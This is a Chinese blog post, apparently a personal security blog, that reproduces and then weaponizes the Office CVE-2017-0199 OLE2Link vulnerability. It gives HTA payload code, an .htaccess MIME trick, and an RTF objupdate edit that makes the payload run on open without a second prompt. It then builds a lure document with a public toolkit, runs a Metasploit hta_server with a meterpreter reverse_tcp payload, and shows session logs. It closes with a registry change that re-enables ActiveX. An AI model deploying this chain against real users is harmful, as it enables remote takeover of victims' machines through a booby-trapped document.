<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="Keywords" content="blog"/>
    <meta name="Description" content="blog"/>
    <title>Simple</title>
    <link rel="shortcut icon" href="/static/favicon.png"/>
    <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
<div class="main">
    <div class="header">
    	<ul id="pages">
            <li><a href="/">home</a></li>
            <li><a href="/#/tags">tags</a></li>
            <li><a href="/#/archive">archive</a></li>
    	</ul>
    </div>
	<div class="wrap-header">
    <h1>
    <a href="/" id="title"></a>
    </h1>
	</div>
<xmp id="md" style="display: none;">
<!-- markdown -->
漏洞原理移步 [绿盟](http://blog.nsfocus.net/microsoft-office-ole2link-exploits-technology-analysis/).

环境 Ubuntu 16.04 for WSL, Windows 7, Office 2010.

## 复现过程

搭建 Apache 服务器.

```
sudo apt install apache2 php
```

编辑 `/etc/apache2/apache2.conf`, 添加以下内容.

```
<Directory /var/www/html/>
    AllowOverride All
</Directory>
```

重启 Apache.

```
sudo service apache2 restart
```

在网站目录下创建 .htaccess 文件, 内容如下.

```
AddType application/rtf .rtf
```

同目录下创建 test.rtf 作为 Payload.

```
test
<script>
var ws = new ActiveXObject("wscript.shell");
ws.Run("%SystemRoot%\\system32\\calc.exe");
window.close();
</script>
```

创建任意文档(注意要在未打补丁的环境下创建), 添加对象.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731180814.png)

另存为 rtf 格式.

更改 .htaccess 为如下内容.

```
AddType application/hta .rtf
```

清除 IE 缓存, 重新打开文档.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731181725.png)

点击 "是".

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731181454.png)

复现成功.

但这里就有三个问题: 1. calc 被执行两次 2. 两个警告对话框 3. 文档是 rtf 格式.

第一个问题在我这无法解决, 那么如何让用户去点击按钮, 而且是在日常中不是很常见的 rtf 文档里呢?

## 改进载荷

关于第一个问题, Payload 执行两次一般来说并没有什么太大的影响 (至少对我来说).

下面解决第二个问题.

用编辑器打开 rtf 文档, 找到以下字符串.

```
\object\objautlink\rsltpict
```

修改为.

```
\object\objautlink\objupdate\rsltpict
```

这里我们添加了 objupdate 参数, 它将使文档被打开时自动更新文档中对象的内容, 也就是自动去请求 Payload.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731182436.png)

再次打开后就会自动执行 calc 命令, 而且你会发现第二个警告框也没有了 :)

对于第三个问题, 添加的 objupdate 参数是 rtf 的特性, docx 不能兼容, 但是当文件名以 .doc 结尾的时候却能够成功打开.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731182744.png)

问题解决.

## 武器化

[bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

生成恶意文档.

```
cve-2017-0199-toolkit.py -M gen -t rtf -w sales.rtf -u http://192.168.1.1/test.hta
```

这里对 Payload 的后缀没有限制, 只要返回头中存在 `Content-Type: application/hta` 即可.

例如 PHP.

```
<?php @header("Content-Type: application/hta");?>
test
<script>
var a = new ActiveXObject("wscript.shell");
a.Run("%SystemRoot%\\system32\\calc.exe");
window.close();
</script>
```

此外 toolkit 中还有启动服务器的选项, 不过我更喜欢自己构造 Payload :)

使用 Metasploit 作为 hta 服务器 (Cobalt Strike Empire 同理).

```
use exploit/windows/misc/hta_server
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
run -j
```

下面只需要打开文档.

```
[*] 192.168.1.102    hta_server - Delivering Payload
[*] Sending stage (179779 bytes) to 192.168.1.102
[*] Meterpreter session 1 opened (192.168.1.1:4444 -> 192.168.1.102:49183) at 2019-07-31 17:35:53 +0800
[*] Sending stage (179779 bytes) to 192.168.1.102
[*] Meterpreter session 2 opened (192.168.1.1:4444 -> 192.168.1.102:49184) at 2019-07-31 17:35:54 +0800
```

成功.

## 利用失败

如果你利用失败了, 很大可能是系统默认禁用了通过 hta 方式执行 ActiveX, 这也是这个漏洞为什么那么鸡肋的原因.

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{3050f4d8-98b5-11cf-BB82-00AA00BDCE0B}]
"Compatibility Flags"=dword:00000000
```

另存为 allow.reg, 然后双击合并.
<!-- markdown end -->
</xmp>
<div class="entry" id="main">
<!-- content -->
<p>漏洞原理移步 <a href="http://blog.nsfocus.net/microsoft-office-ole2link-exploits-technology-analysis/">绿盟</a>.</p>

<p>环境 Ubuntu 16.04 for WSL, Windows 7, Office 2010.</p>

<h2 id="">复现过程</h2>

<p>搭建 Apache 服务器.</p>

<pre><code>sudo apt install apache2 php
</code></pre>

<p>编辑 <code>/etc/apache2/apache2.conf</code>, 添加以下内容.</p>

<pre><code>&lt;Directory /var/www/html/&gt;
    AllowOverride All
&lt;/Directory&gt;
</code></pre>

<p>重启 Apache.</p>

<pre><code>sudo service apache2 restart
</code></pre>

<p>在网站目录下创建 .htaccess 文件, 内容如下.</p>

<pre><code>AddType application/rtf .rtf
</code></pre>

<p>同目录下创建 test.rtf 作为 Payload.</p>

<pre><code>test
&lt;script&gt;
var ws = new ActiveXObject("wscript.shell");
ws.Run("%SystemRoot%\\system32\\calc.exe");
window.close();
&lt;/script&gt;
</code></pre>

<p>创建任意文档(注意要在未打补丁的环境下创建), 添加对象.</p>

<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731180814.png" alt="" title=""></p>

<p>另存为 rtf 格式.</p>

<p>更改 .htaccess 为如下内容.</p>

<pre><code>AddType application/hta .rtf
</code></pre>

<p>清除 IE 缓存, 重新打开文档.</p>

<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731181725.png" alt="" title=""></p>

<p>点击 "是".</p>

<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731181454.png" alt="" title=""></p>

<p>复现成功.</p>

<p>但这里就有三个问题: 1. calc 被执行两次 2. 两个警告对话框 3. 文档是 rtf 格式.</p>

<p>第一个问题在我这无法解决, 那么如何让用户去点击按钮, 而且是在日常中不是很常见的 rtf 文档里呢?</p>

<h2 id="">改进载荷</h2>

<p>关于第一个问题, Payload 执行两次一般来说并没有什么太大的影响 (至少对我来说).</p>

<p>下面解决第二个问题.</p>

<p>用编辑器打开 rtf 文档, 找到以下字符串.</p>

<pre><code>\object\objautlink\rsltpict
</code></pre>

<p>修改为.</p>

<pre><code>\object\objautlink\objupdate\rsltpict
</code></pre>

<p>这里我们添加了 objupdate 参数, 它将使文档被打开时自动更新文档中对象的内容, 也就是自动去请求 Payload.</p>

<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731182436.png" alt="" title=""></p>

<p>再次打开后就会自动执行 calc 命令, 而且你会发现第二个警告框也没有了 :)</p>

<p>对于第三个问题, 添加的 objupdate 参数是 rtf 的特性, docx 不能兼容, 但是当文件名以 .doc 结尾的时候却能够成功打开.</p>

<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190731182744.png" alt="" title=""></p>

<p>问题解决.</p>

<h2 id="">武器化</h2>

<p><a href="https://github.com/bhdresh/CVE-2017-0199">bhdresh/CVE-2017-0199</a></p>

<p>生成恶意文档.</p>

<pre><code>cve-2017-0199-toolkit.py -M gen -t rtf -w sales.rtf -u http://192.168.1.1/test.hta
</code></pre>

<p>这里对 Payload 的后缀没有限制, 只要返回头中存在 <code>Content-Type: application/hta</code> 即可.</p>

<p>例如 PHP.</p>

<pre><code>&lt;?php @header("Content-Type: application/hta");?&gt;
test
&lt;script&gt;
var a = new ActiveXObject("wscript.shell");
a.Run("%SystemRoot%\\system32\\calc.exe");
window.close();
&lt;/script&gt;
</code></pre>

<p>此外 toolkit 中还有启动服务器的选项, 不过我更喜欢自己构造 Payload :)</p>

<p>使用 Metasploit 作为 hta 服务器 (Cobalt Strike Empire 同理).</p>

<pre><code>use exploit/windows/misc/hta_server
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
run -j
</code></pre>

<p>下面只需要打开文档.</p>

<pre><code>[*] 192.168.1.102    hta_server - Delivering Payload
[*] Sending stage (179779 bytes) to 192.168.1.102
[*] Meterpreter session 1 opened (192.168.1.1:4444 -&gt; 192.168.1.102:49183) at 2019-07-31 17:35:53 +0800
[*] Sending stage (179779 bytes) to 192.168.1.102
[*] Meterpreter session 2 opened (192.168.1.1:4444 -&gt; 192.168.1.102:49184) at 2019-07-31 17:35:54 +0800
</code></pre>

<p>成功.</p>

<h2 id="">利用失败</h2>

<p>如果你利用失败了, 很大可能是系统默认禁用了通过 hta 方式执行 ActiveX, 这也是这个漏洞为什么那么鸡肋的原因.</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{3050f4d8-98b5-11cf-BB82-00AA00BDCE0B}]
"Compatibility Flags"=dword:00000000
</code></pre>

<p>另存为 allow.reg, 然后双击合并.</p>
<!-- content end -->
</div>
<br>
<br>
    <div id="disqus_thread"></div>
	<div class="footer">
		<p>© Copyright 2017-2019 by X1r0z</p>
	</div>
</div>
<script src="main.js"></script>
<script id="content" type="text/mustache">
    <h1>{{title}}</h1>
    <div class="tag">
    {{date}}
    {{#tags}}
    <a href="/#/tag/{{name}}">#{{name}}</a>
    {{/tags}}
    </div>
</script>
<script id="pagesTemplate" type="text/mustache">
    {{#pages}}
    <li>
        <a href="{{path}}">{{title}}</a>
    </li>
    {{/pages}}
</script>
<script>
$(document).ready(function() {
    $.ajax({
        url: "main.json",
        type: "GET",
        dataType: "json",
        success: function(data) {
            $("#title").html(data.name);
            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
            var pagesHtml = pagesTemplate.render({"pages": data.pages});
            $("#pages").append(pagesHtml);
            //path
            var path = "office-cve-2017-0199.html";
            //path end
            var now = 0;
            for (var i = 0; i < data.posts.length; ++i)
                if (path == data.posts[i].path)
                    now = i;
            var post = data.posts[now];
            var tmp = post.tags.split(" ");
            var tags = [];
            for (var i = 0; i < tmp.length; ++i)
                if (tmp[i].length > 0)
                    tags.push({"name": tmp[i]});
            var contentTemplate = Hogan.compile($("#content").html());
            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
            $("#main").prepend(contentHtml);
            if (data.disqus_shortname.length > 0) {
                var disqus_shortname = data.disqus_shortname;
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            }
        }
    });
});
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
</script>
</body>
</html>
